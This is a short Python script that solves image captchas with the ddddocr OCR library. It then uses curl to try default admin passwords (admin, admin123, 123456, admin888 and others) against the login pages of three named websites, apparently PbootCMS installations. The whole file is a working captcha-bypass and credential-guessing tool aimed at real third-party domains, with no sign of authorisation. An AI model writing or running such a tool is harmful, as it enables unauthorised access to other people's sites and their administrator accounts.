#!/usr/bin/env python3
"""ddddocr验证码识别 + 自动登录"""
import subprocess, ddddocr, time, sys

ocr = ddddocr.DdddOcr()

def curl(url, cookie_file, data=None, output_file=None):
    cmd = ["curl", "-sk", "--connect-timeout", "5", "--max-time", "10",
           "-b", cookie_file, "-c", cookie_file]
    if data:
        cmd += ["-X", "POST", "-d", data]
    if output_file:
        cmd += ["-o", output_file]
    else:
        cmd += ["-o", "/dev/null"]
    cmd.append(url)
    subprocess.run(cmd, capture_output=True, timeout=12)

def get_captcha(base_url, captcha_path, cookie_file):
    subprocess.run(["rm", "-f", cookie_file])
    curl(base_url + "/", cookie_file)
    curl(base_url + captcha_path, cookie_file, output_file="/tmp/captcha.png")
    with open("/tmp/captcha.png", "rb") as f:
        img = f.read()
    if len(img) < 100:
        return None
    result = ocr.classification(img)
    return result.strip()

def try_login(base_url, login_path, user, pwd, captcha, cookie_file):
    curl(base_url + login_path, cookie_file,
         data="username=" + user + "&password=" + pwd + "&checkcode=" + captcha)

# 测试目标
targets = [
    ("wxtzzn.com", "/core/code.php", "/admin.php/index/login", "admin", ["admin", "admin123", "123456", "admin888", "pboot"]),
    ("ntjshj.com", "/core/code.php", "/admin.php/index/login", "admin", ["admin", "admin123", "123456", "admin888"]),
    ("choexpo.cn", "/core/code.php", "/admin.php/index/login", "admin", ["admin", "admin123", "123456"]),
]

for domain, captcha_path, login_path, user, passwords in targets:
    base = "http://" + domain
    print(f"\n[{domain}]")
    
    alive = subprocess.run(["curl", "-sk", "-o", "/dev/null", "-w", "%{http_code}", 
                            "--connect-timeout", "5", base + "/"], 
                           capture_output=True, text=True).stdout.strip()
    if alive == "000":
        print("  DEAD")
        continue
    
    cookie = "/tmp/cap_" + domain.replace(".", "_") + ".txt"
    captcha = get_captcha(base, captcha_path, cookie)
    if not captcha:
        print("  Captcha FAIL")
        continue
    
    print(f"  Captcha: [{captcha}]")
    
    for pw in passwords:
        try_login(base, login_path, user, pw, captcha, cookie)
        # TODO: verify login success
        print(f"    Tried {user}:{pw} with code={captcha}")
    
    time.sleep(1)

print("\nDone")
